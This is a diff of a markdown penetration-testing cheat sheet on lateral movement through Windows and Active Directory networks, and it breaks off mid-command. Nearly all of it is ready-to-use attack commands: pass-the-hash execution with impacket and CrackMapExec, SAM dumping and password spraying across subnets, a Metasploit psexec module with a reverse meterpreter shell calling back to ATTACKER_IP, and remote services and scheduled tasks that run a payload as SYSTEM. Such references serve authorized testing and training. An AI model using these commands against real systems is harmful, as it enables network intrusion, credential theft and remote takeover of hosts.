@@ -12,7 +12,7 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 3. [Linux Lateral Movement](#3-linux-lateral-movement)
 4. [Credential Reuse and Password Spraying](#4-credential-reuse-and-password-spraying)
 5. [AD-Specific Movement](#5-ad-specific-lateral-movement)
-6. [Progress Tracking and Documentation](#6-progress-tracking-and-documentation)
+6. [Pivoting & Tunneling (Ligolo-ng)](#6-pivoting--tunneling-ligolo-ng)
 
 ---
 
@@ -21,8 +21,7 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 ### Strategy & Visualization
 
 - [ ] **Visualize Nodes & Edges** → [1.1](#11-network-visualization-concept)
-- [ ] **Init Tracking Table** → [1.2](#12-centralized-movement-tracking-table)
-- [ ] **Identify High-Value Targets** → [1.2](#12-centralized-movement-tracking-table)
+- [ ] **Identify High-Value Targets** → [1.2](#12-high-value-target-prioritization)
 
 ### Windows Movement
 - [ ] **PSExec/SMB Exec** → [2.1](#21-psexec-style-execution)
@@ -33,7 +32,7 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 
 ### Linux Movement
 - [ ] **SSH Access/Keys** → [3.1](#31-ssh-access)
-- [ ] **Proxychains Pivot** → [3.2](#32-proxychains-pivoting)
+- [ ] **Pivoting** → [3.2](#32-pivoting)
 - [ ] **Harvest SSH Keys** → [3.3](#33-ssh-key-harvesting)
 - [ ] **SSH Agent Hijack** → [3.3](#33-ssh-key-harvesting)
 
@@ -55,11 +54,12 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 - [ ] **Map Shortest Paths** → [5.4](#54-bloodhound-informed-movement)
 - [ ] **Target ACLs/GPOs** → [5.4](#54-bloodhound-informed-movement)
 
-### 7. Tracking & Documentation
-- [ ] **Update Dashboard** → [6.1](#61-centralized-movement-dashboard)
-- [ ] **Prioritize Targets** → [6.2](#62-next-target-prioritization)
-- [ ] **Map Compromise Path** → [6.2](#62-next-target-prioritization)
-
+### Pivoting & Tunneling
+- [ ] **Ligolo-ng Setup** → [6.1](#61-ligolo-ng-setup)
+- [ ] **Proxy/Agent Live** → [6.2](#62-ligolo-ng-basic-flow)
+- [ ] **Routes & Listeners** → [6.3](#63-routing--port-forwarding)
+- [ ] **Multi-Hop Ready** → [6.4](#64-multi-hop-pivoting)
+- [ ] **SSH/Chisel Fallbacks** → [6.5](#65-ssh--chisel-quick-hits)
 ---
 
 ## 1 Strategy and Attack Graphs
@@ -72,22 +72,9 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 - **🔗 Edges**: Connection methods (SMB, WinRM, RDP, SSH, WMI)
 - **🏷️ Labels**: Access levels (local admin, user, domain admin)
 
-### 1.2 Centralized Movement Tracking Table
+### 1.2 High-Value Target Prioritization
 
-**Movement Tracking Template:**
-
-```markdown
-## 🔄 Lateral Movement Tracker
-
-| Host | IP | Method | Credentials Used | Access Level | Notes |
-|------|----|--------|------------------|-------------|-------|
-| SRV-WEB01 | 10.11.1.5 | WinRM | domain\webadmin / Pass123 | Local Admin | Web server with DB connections |
-| WS-USER02 | 10.11.1.15 | SMB PtH | domain\user02 / NTLM_HASH | User | Found RDP credentials in memory |
-| DC01 | 10.11.1.20 | DCSync | domain\administrator / Hash | Domain Admin | Golden ticket created |
-| SRV-SQL01 | 10.11.1.25 | WMI | domain\sqlservice / Pass456 | Local Admin | Service account reuse |
-```
-
-**Priority Targeting:**
+Focus movement on assets that shorten the path to domain impact:
 
 1. 🎯 **Domain Controllers** - Highest value targets
 2. 🏰 **Infrastructure Servers** - SQL, Exchange, File Servers
@@ -105,55 +92,55 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 
 ```bash
 # Basic PSExec with password
-impacket-psexec domain.local/user:Password123@10.11.1.30
-psexec.py domain.local/user:Password123@10.11.1.30
+impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
 
 # Pass-the-Hash
-impacket-psexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH
-psexec.py domain.local/user@10.11.1.30 -hashes :NTLM_HASH
+impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
+psexec.py <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
 
 # With specific command
-impacket-psexec domain.local/<USER>:<PASSWORD>@10.11.1.30 -c "whoami /all"
-psexec.py domain.local/user:Password123@10.11.1.30 "whoami /all"
+impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -c "whoami /all"
+psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami /all"
 
 # Debug mode for troubleshooting
-impacket-psexec domain.local/user:Password123@10.11.1.30 -debug
-psexec.py domain.local/user:Password123@10.11.1.30 -debug
+impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -debug
+psexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -debug
 
 # With local authentication
-impacket-psexec ./administrator:Password123@10.11.1.30
+impacket-psexec ./administrator:<PASSWORD>@<TARGET_IP>
 
 # Using full hash format (LM:NTLM)
-impacket-psexec domain.local/user@10.11.1.30 -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
+impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes <LM_HASH>:<NTLM_HASH>
 ```
 
 **CrackMapExec for Mass Execution**
 
 ```bash
 # Scan and execute on multiple hosts
-crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' -x "whoami"
-cme smb 10.11.1.0/24 -u user -p 'Password123' -x "whoami"
+crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"
+cme smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"
 
 # Pass-the-Hash across subnet
-crackmapexec smb 10.11.1.0/24 -u user -H NTLM_HASH -x "systeminfo"
-cme smb 10.11.1.0/24 -u user -H NTLM_HASH -x "systeminfo"
+crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -H <NTLM_HASH> -x "systeminfo"
+cme smb <SUBNET_CIDR> -u <USERNAME> -H <NTLM_HASH> -x "systeminfo"
 
 # Execute PowerShell script
-crackmapexec smb 10.11.1.30 -u user -p 'Password123' -X "Get-Process"
-cme smb 10.11.1.30 -u user -p 'Password123' -X '$PSVersionTable'
+crackmapexec smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X "Get-Process"
+cme smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X '$PSVersionTable'
 
 # Dump SAM from multiple hosts
-crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --sam
-cme smb 10.11.1.0/24 -u user -p 'Password123' --sam
+crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' --sam
+cme smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' --sam
 
 # Check local admin access
-crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' --local-auth
+crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' --local-auth
 
 # Using multiple usernames/passwords from files
-crackmapexec smb 10.11.1.0/24 -u users.txt -p passwords.txt --continue-on-success
+crackmapexec smb <SUBNET_CIDR> -u users.txt -p passwords.txt --continue-on-success
 
 # Execute command and save output
-crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' -x "ipconfig" --no-output
+crackmapexec smb <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "ipconfig" --no-output
 ```
 
 **Metasploit PSExec**
@@ -161,19 +148,19 @@ crackmapexec smb 10.11.1.0/24 -u user -p 'Password123' -x "ipconfig" --no-output
 ```bash
 # Module for PSExec
 use exploit/windows/smb/psexec
-set RHOSTS 10.11.1.30
-set SMBUser user
-set SMBPass Password123
-set SMBDomain domain.local
+set RHOSTS <TARGET_IP>
+set SMBUser <USERNAME>
+set SMBPass <PASSWORD>
+set SMBDomain <DOMAIN>
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 10.10.14.5
+set LHOST <ATTACKER_IP>
 exploit
 
 # PSExec with Pass-the-Hash
 use exploit/windows/smb/psexec
-set SMBUser administrator
-set SMBPass aad3b435b51404eeaad3b435b51404ee:NTLM_HASH
-set RHOSTS 10.11.1.30
+set SMBUser <USERNAME>
+set SMBPass <LM_HASH>:<NTLM_HASH>
+set RHOSTS <TARGET_IP>
 exploit
 ```
 
@@ -183,67 +170,67 @@ exploit
 
 ```bash
 # WMI execution with credentials
-impacket-wmiexec domain.local/user:Password123@10.11.1.30
-wmiexec.py domain.local/user:Password123@10.11.1.30
+impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
 
 # Pass-the-Hash via WMI
-impacket-wmiexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH
-wmiexec.py domain.local/user@10.11.1.30 -hashes :NTLM_HASH
+impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
+wmiexec.py <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
 
 # Interactive shell
-impacket-wmiexec domain.local/user:Password123@10.11.1.30
-wmiexec.py domain.local/user:Password123@10.11.1.30
+impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
+wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
 
 # Single command execution
-impacket-wmiexec domain.local/user:Password123@10.11.1.30 "whoami && ipconfig"
-wmiexec.py domain.local/user:Password123@10.11.1.30 "whoami && hostname"
+impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami && ipconfig"
+wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami && hostname"
 
 # With local authentication
-impacket-wmiexec ./administrator:Password123@10.11.1.30
+impacket-wmiexec ./administrator:<PASSWORD>@<TARGET_IP>
 
 # Silent mode (no output to stdout)
-wmiexec.py domain.local/user:Password123@10.11.1.30 -silentcommand
+wmiexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> -silentcommand
 ```
 
 **PowerShell WMI (From Windows)**
 
 ```powershell
 # Check WMI availability
-Test-WSMan 10.11.1.30
+Test-WSMan <TARGET_IP>
 
 # Execute command via WMI
-Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName 10.11.1.30
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName <TARGET_IP>
 
 # Get process list remotely
-Get-WmiObject -Class Win32_Process -ComputerName 10.11.1.30
+Get-WmiObject -Class Win32_Process -ComputerName <TARGET_IP>
 
 # With credentials
-$Username = 'domain\user'
-$Password = 'Password123'
+$Username = '<DOMAIN>\<USERNAME>'
+$Password = '<PASSWORD>'
 $SecPass = ConvertTo-SecureString $Password -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential($Username, $SecPass)
-Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\output.txt" -ComputerName 10.11.1.30 -Credential $Cred
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > <REMOTE_PATH>\output.txt" -ComputerName <TARGET_IP> -Credential $Cred
 
 # Create persistent WMI connection
-$Session = New-CimSession -ComputerName 10.11.1.30 -Credential (Get-Credential)
+$Session = New-CimSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='whoami'}
 
 # Query system information
-Get-WmiObject -Class Win32_OperatingSystem -ComputerName 10.11.1.30 | Select-Object Caption, Version, BuildNumber
+Get-WmiObject -Class Win32_OperatingSystem -ComputerName <TARGET_IP> | Select-Object Caption, Version, BuildNumber
 
 # Get installed software
-Get-WmiObject -Class Win32_Product -ComputerName 10.11.1.30
+Get-WmiObject -Class Win32_Product -ComputerName <TARGET_IP>
 ```
 
 **CrackMapExec WMI**
 
 ```bash
 # WMI execution
-crackmapexec wmi 10.11.1.0/24 -u user -p 'Password123' -x "whoami"
-cme wmi 10.11.1.0/24 -u user -p 'Password123' -x "hostname"
+crackmapexec wmi <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"
+cme wmi <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "hostname"
 
 # Pass-the-Hash via WMI
-crackmapexec wmi 10.11.1.30 -u user -H NTLM_HASH -x "ipconfig"
+crackmapexec wmi <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x "ipconfig"
 ```
 
 ### 2.3 WinRM and PowerShell Remoting
@@ -252,16 +239,16 @@ crackmapexec wmi 10.11.1.30 -u user -H NTLM_HASH -x "ipconfig"
 
 ```bash
 # Scan for WinRM ports
-nmap -p 5985,5986 10.11.1.0/24
-nmap -p 5985,5986 -sV 10.11.1.0/24
+nmap -p <WINRM_PORTS> <SUBNET_CIDR>
+nmap -p <WINRM_PORTS> -sV <SUBNET_CIDR>
 
 # Check WinRM status remotely
-crackmapexec winrm 10.11.1.0/24 -u user -p 'Password123'
-cme winrm 10.11.1.0/24 -u user -p 'Password123'
+crackmapexec winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'
+cme winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'
 
 # Enumerate WinRM with Metasploit
 use auxiliary/scanner/winrm/winrm_auth_methods
-set RHOSTS 10.11.1.0/24
+set RHOSTS <SUBNET_CIDR>
 run
 ```
 
@@ -269,29 +256,29 @@ run
 
 ```bash
 # Basic WinRM connection
-evil-winrm -i 10.11.1.30 -u user -p 'Password123'
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'
 
 # Pass-the-Hash
-evil-winrm -i 10.11.1.30 -u user -H NTLM_HASH
+evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>
 
 # With domain specification
-evil-winrm -i 10.11.1.30 -u user -p 'Password123' -d domain.local
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN>
 
 # Upload files during session
-evil-winrm -i 10.11.1.30 -u user -p 'Password123' -s /path/to/scripts -e /path/to/exes
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -s <SCRIPTS_DIR> -e <EXES_DIR>
 
 # SSL connection
-evil-winrm -i 10.11.1.30 -u user -p 'Password123' -S -P 5986
+evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -S -P 5986
 
 # Within Evil-WinRM session:
 # Upload file
-*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\temp\file.exe
+*Evil-WinRM* PS C:\> upload /local/path/file.exe <REMOTE_PATH>\file.exe
 
 # Download file
-*Evil-WinRM* PS C:\> download C:\temp\file.txt /local/path/file.txt
+*Evil-WinRM* PS C:\> download <REMOTE_PATH>\file.txt /local/path/file.txt
 
 # Load PowerShell script
-*Evil-WinRM* PS C:\> Invoke-Binary /path/to/binary.exe
+*Evil-WinRM* PS C:\> Invoke-Binary <EXES_DIR>\binary.exe
 
 # Menu
 *Evil-WinRM* PS C:\> menu
@@ -301,50 +288,50 @@ evil-winrm -i 10.11.1.30 -u user -p 'Password123' -S -P 5986
 
 ```powershell
 # Test connectivity
-Test-WSMan 10.11.1.30
-Test-WSMan -ComputerName 10.11.1.30 -Authentication Default
+Test-WSMan <TARGET_IP>
+Test-WSMan -ComputerName <TARGET_IP> -Authentication Default
 
 # Enter PSSession
-Enter-PSSession -ComputerName 10.11.1.30 -Credential (Get-Credential)
+Enter-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
 
 # Execute remote command
-Invoke-Command -ComputerName 10.11.1.30 -ScriptBlock { whoami; systeminfo } -Credential (Get-Credential)
+Invoke-Command -ComputerName <TARGET_IP> -ScriptBlock { whoami; systeminfo } -Credential (Get-Credential)
 
 # Create persistent session
-$Session = New-PSSession -ComputerName 10.11.1.30 -Credential (Get-Credential)
+$Session = New-PSSession -ComputerName <TARGET_IP> -Credential (Get-Credential)
 Invoke-Command -Session $Session -ScriptBlock { whoami }
 
 # Multiple computers
-Invoke-Command -ComputerName 10.11.1.30,10.11.1.31,10.11.1.32 -ScriptBlock { Get-Service } -Credential (Get-Credential)
+Invoke-Command -ComputerName <TARGET_IP>,10.11.1.31,10.11.1.32 -ScriptBlock { Get-Service } -Credential (Get-Credential)
 
 # Execute script file
-Invoke-Command -ComputerName 10.11.1.30 -FilePath C:\scripts\script.ps1 -Credential (Get-Credential)
+Invoke-Command -ComputerName <TARGET_IP> -FilePath <REMOTE_PATH>\script.ps1 -Credential (Get-Credential)
 
 # Copy item to remote session
-Copy-Item -Path C:\local\file.txt -Destination C:\remote\ -ToSession $Session
+Copy-Item -Path C:\local\file.txt -Destination <REMOTE_PATH>\ -ToSession $Session
 
 # Copy item from remote session
-Copy-Item -Path C:\remote\file.txt -Destination C:\local\ -FromSession $Session
+Copy-Item -Path <REMOTE_PATH>\file.txt -Destination C:\local\ -FromSession $Session
 
 # Enable PSRemoting (if you have access)
 Enable-PSRemoting -Force
 
 # Configure TrustedHosts (if needed)
-Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.11.1.30" -Force
+Set-Item WSMan:\localhost\Client\TrustedHosts -Value "<TARGET_IP>" -Force
 ```
 
 **CrackMapExec WinRM**
 
 ```bash
 # Execute commands via WinRM
-crackmapexec winrm 10.11.1.0/24 -u user -p 'Password123' -x "whoami"
-cme winrm 10.11.1.0/24 -u user -p 'Password123' -x "hostname"
+crackmapexec winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "whoami"
+cme winrm <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>' -x "hostname"
 
 # Pass-the-Hash via WinRM
-crackmapexec winrm 10.11.1.30 -u user -H NTLM_HASH -x "ipconfig"
+crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x "ipconfig"
 
 # Execute PowerShell command
-crackmapexec winrm 10.11.1.30 -u user -p 'Password123' -X '$env:computername'
+crackmapexec winrm <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' -X '$env:computername'
 ```
 
 ### 2.4 RDP (Remote Desktop)
@@ -353,84 +340,84 @@ crackmapexec winrm 10.11.1.30 -u user -p 'Password123' -X '$env:computername'
 
 ```bash
 # Scan for RDP
-nmap -p 3389 10.11.1.0/24
-nmap -p 3389 -sV --script rdp-enum-encryption 10.11.1.0/24
+nmap -p <RDP_PORT> <SUBNET_CIDR>
+nmap -p <RDP_PORT> -sV --script rdp-enum-encryption <SUBNET_CIDR>
 
 # Check RDP security
-rdp-sec-check 10.11.1.30
+rdp-sec-check <TARGET_IP>
 
 # Metasploit RDP scanner
 use auxiliary/scanner/rdp/rdp_scanner
-set RHOSTS 10.11.1.0/24
+set RHOSTS <SUBNET_CIDR>
 run
 
 # Check for BlueKeep vulnerability
-nmap -p 3389 --script rdp-vuln-ms12-020 10.11.1.0/24
+nmap -p <RDP_PORT> --script rdp-vuln-ms12-020 <SUBNET_CIDR>
 ```
 
 **xfreerdp (Linux)**
 
 ```bash
 # Basic RDP connection
-xfreerdp /u:domain\\user /p:Password123 /v:10.11.1.30 /dynamic-resolution /cert:ignore
+xfreerdp /u:<DOMAIN>\\<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /dynamic-resolution /cert:ignore
 
 # Alternative syntax
-xfreerdp /u:user /p:Password123 /d:domain.local /v:10.11.1.30 /cert:ignore
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /v:<TARGET_IP> /cert:ignore
 
 # Pass-the-Hash (if supported - requires freerdp 2.0+)
-xfreerdp /u:domain\\user /pth:NTLM_HASH /v:10.11.1.30 /dynamic-resolution /cert:ignore
+xfreerdp /u:<DOMAIN>\\<USERNAME> /pth:<NTLM_HASH> /v:<TARGET_IP> /dynamic-resolution /cert:ignore
 
 # With specific domain
-xfreerdp /u:user /d:domain.local /p:Password123 /v:10.11.1.30 /cert:ignore
+xfreerdp /u:<USERNAME> /d:<DOMAIN> /p:<PASSWORD> /v:<TARGET_IP> /cert:ignore
 
 # Multiple monitors and drive sharing
-xfreerdp /u:user /p:Password123 /v:10.11.1.30 +home-drive /multimon
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> +home-drive /multimon
 
 # Full screen mode
-xfreerdp /u:user /p:Password123 /v:10.11.1.30 /f /cert:ignore
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /f /cert:ignore
 
 # Share local directory
-xfreerdp /u:user /p:Password123 /v:10.11.1.30 /drive:share,/tmp/share /cert:ignore
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /drive:share,<LOCAL_SHARE_DIR> /cert:ignore
 
 # Custom resolution
-xfreerdp /u:user /p:Password123 /v:10.11.1.30 /size:1920x1080 /cert:ignore
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /size:1920x1080 /cert:ignore
 
 # Clipboard sharing
-xfreerdp /u:user /p:Password123 /v:10.11.1.30 +clipboard /cert:ignore
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> +clipboard /cert:ignore
 
 # Network level authentication
-xfreerdp /u:user /p:Password123 /v:10.11.1.30 /sec:nla /cert:ignore
+xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP> /sec:nla /cert:ignore
 ```
 
 **rdesktop (Alternative)**
 
 ```bash
 # Basic connection
-rdesktop -u user -p Password123 -d domain 10.11.1.30
+rdesktop -u <USERNAME> -p <PASSWORD> -d <DOMAIN> <TARGET_IP>
 
 # Full screen
-rdesktop -u user -p Password123 -d domain -f 10.11.1.30
+rdesktop -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -f <TARGET_IP>
 
 # Custom geometry
-rdesktop -u user -p Password123 -g 1920x1080 10.11.1.30
+rdesktop -u <USERNAME> -p <PASSWORD> -g 1920x1080 <TARGET_IP>
 
 # Sound redirection
-rdesktop -u user -p Password123 -r sound:local 10.11.1.30
+rdesktop -u <USERNAME> -p <PASSWORD> -r sound:local <TARGET_IP>
 
 # Share directory
-rdesktop -u user -p Password123 -r disk:share=/tmp/share 10.11.1.30
+rdesktop -u <USERNAME> -p <PASSWORD> -r disk:share=<LOCAL_SHARE_DIR> <TARGET_IP>
 ```
 
 **RDP Session Management**
 
 ```powershell
 # Check RDP sessions remotely
-qwinsta /server:10.11.1.30
-query user /server:10.11.1.30
+qwinsta /server:<TARGET_IP>
+query user /server:<TARGET_IP>
 
 # Log off specific session
-rwinsta 1 /server:10.11.1.30
-logoff 1 /server:10.11.1.30
+rwinsta 1 /server:<TARGET_IP>
+logoff 1 /server:<TARGET_IP>
 
 # Enable RDP remotely (requires admin access)
 Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
@@ -450,11 +437,11 @@ Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" 
 
 ```bash
 # Check RDP access
-crackmapexec rdp 10.11.1.0/24 -u user -p 'Password123'
-cme rdp 10.11.1.0/24 -u user -p 'Password123'
+crackmapexec rdp <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'
+cme rdp <SUBNET_CIDR> -u <USERNAME> -p '<PASSWORD>'
 
 # Screenshot capability
-crackmapexec rdp 10.11.1.30 -u user -p 'Password123' --screenshot
+crackmapexec rdp <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --screenshot
 ```
 
 ### 2.5 Service-Based Execution
@@ -463,94 +450,94 @@ crackmapexec rdp 10.11.1.30 -u user -p 'Password123' --screenshot
 
 ```powershell
 # Create service remotely
-sc \\10.11.1.30 create "TempService" binPath= "cmd.exe /c C:\temp\payload.exe"
-sc \\10.11.1.30 start "TempService"
-sc \\10.11.1.30 delete "TempService"
+sc \\<TARGET_IP> create "<SERVICE_NAME>" binPath= "cmd.exe /c <REMOTE_PATH>\payload.exe"
+sc \\<TARGET_IP> start "<SERVICE_NAME>"
+sc \\<TARGET_IP> delete "<SERVICE_NAME>"
 
 # Query service status
-sc \\10.11.1.30 query "TempService"
+sc \\<TARGET_IP> query "<SERVICE_NAME>"
 
 # Create service with specific user
-sc \\10.11.1.30 create "TempService" binPath= "C:\temp\payload.exe" obj= "NT AUTHORITY\SYSTEM"
+sc \\<TARGET_IP> create "<SERVICE_NAME>" binPath= "<REMOTE_PATH>\payload.exe" obj= "NT AUTHORITY\SYSTEM"
 
 # Using WMI for service creation
-Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList @($null,$null,"TempService","C:\temp\payload.exe",16,$null,$null,$null,$null,$null,$null) -ComputerName 10.11.1.30
+Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList @($null,$null,"<SERVICE_NAME>","<REMOTE_PATH>\payload.exe",16,$null,$null,$null,$null,$null,$null) -ComputerName <TARGET_IP>
 
 # PowerShell service creation
-New-Service -Name "TempService" -BinaryPathName "C:\temp\payload.exe" -ComputerName 10.11.1.30 -StartupType Manual
-Start-Service -Name "TempService" -ComputerName 10.11.1.30
-Remove-Service -Name "TempService" -ComputerName 10.11.1.30
+New-Service -Name "<SERVICE_NAME>" -BinaryPathName "<REMOTE_PATH>\payload.exe" -ComputerName <TARGET_IP> -StartupType Manual
+Start-Service -Name "<SERVICE_NAME>" -ComputerName <TARGET_IP>
+Remove-Service -Name "<SERVICE_NAME>" -ComputerName <TARGET_IP>
 ```
 
 **Impacket Services**
 
 ```bash
 # Impacket services execution
-impacket-services domain.local/user:Password123@10.11.1.30 list
-impacket-services domain.local/user:Password123@10.11.1.30 start ServiceName
-impacket-services domain.local/user:Password123@10.11.1.30 stop ServiceName
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> list
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> start <SERVICE_NAME>
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> stop <SERVICE_NAME>
 
 # Create and start service
-impacket-services domain.local/user:Password123@10.11.1.30 create -name TempService -display "Temp Service" -path "C:\temp\payload.exe"
-impacket-services domain.local/user:Password123@10.11.1.30 start TempService
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> create -name <SERVICE_NAME> -display "Temp Service" -path "<REMOTE_PATH>\payload.exe"
+impacket-services <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> start <SERVICE_NAME>
 ```
 
 **SchTasks for Execution**
 
 ```powershell
 # Create scheduled task remotely
-schtasks /create /s 10.11.1.30 /tn "TempTask" /tr "C:\temp\payload.exe" /sc once /st 00:00 /ru "SYSTEM"
+schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00 /ru "SYSTEM"
 
 # Run task immediately
-schtasks /run /s 10.11.1.30 /tn "TempTask"
+schtasks /run /s <TARGET_IP> /tn "<TASK_NAME>"
 
 # Delete task
-schtasks /delete /s 10.11.1.30 /tn "TempTask" /f
+schtasks /delete /s <TARGET_IP> /tn "<TASK_NAME>" /f
 
 # Create task with specific user
-schtasks /create /s 10.11.1.30 /u domain\user /p Password123 /tn "TempTask" /tr "C:\temp\payload.exe" /sc once /st 00:00
+schtasks /create /s <TARGET_IP> /u <DOMAIN>\<USERNAME> /p <PASSWORD> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00
 
 # List tasks
-schtasks /query /s 10.11.1.30 /fo LIST /v
+schtasks /query /s <TARGET_IP> /fo LIST /v
 
 # Create task that runs at logon
-schtasks /create /s 10.11.1.30 /tn "StartupTask" /tr "C:\temp\payload.exe" /sc onlogon /ru "SYSTEM"
+schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc onlogon /ru "SYSTEM"
 
 # Run with highest privileges
-schtasks /create /s 10.11.1.30 /tn "PrivTask" /tr "C:\temp\payload.exe" /sc once /st 00:00 /rl HIGHEST
+schtasks /create /s <TARGET_IP> /tn "<TASK_NAME>" /tr "<REMOTE_PATH>\payload.exe" /sc once /st 00:00 /rl HIGHEST
 ```
 
 **Impacket AtExec**
 
 ```bash
 # Execute command via Task Scheduler
-impacket-atexec domain.local/user:Password123@10.11.1.30 "whoami"
-atexec.py domain.local/user:Password123@10.11.1.30 "whoami"
+impacket-atexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"
+atexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "whoami"
 
 # Pass-the-Hash
-impacket-atexec domain.local/user@10.11.1.30 -hashes :NTLM_HASH "systeminfo"
-atexec.py domain.local/user@10.11.1.30 -hashes :NTLM_HASH "systeminfo"
+impacket-atexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"
+atexec.py <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH> "systeminfo"
 
 # Execute command and retrieve output
-atexec.py domain.local/user:Password123@10.11.1.30 "powershell -c Get-Process"
+atexec.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "powershell -c Get-Process"
 ```
 
 **DCOM Execution**
 
 ```powershell
 # MMC20.Application execution
-$com = [Type]::GetTypeFromProgID("MMC20.Application","10.11.1.30")
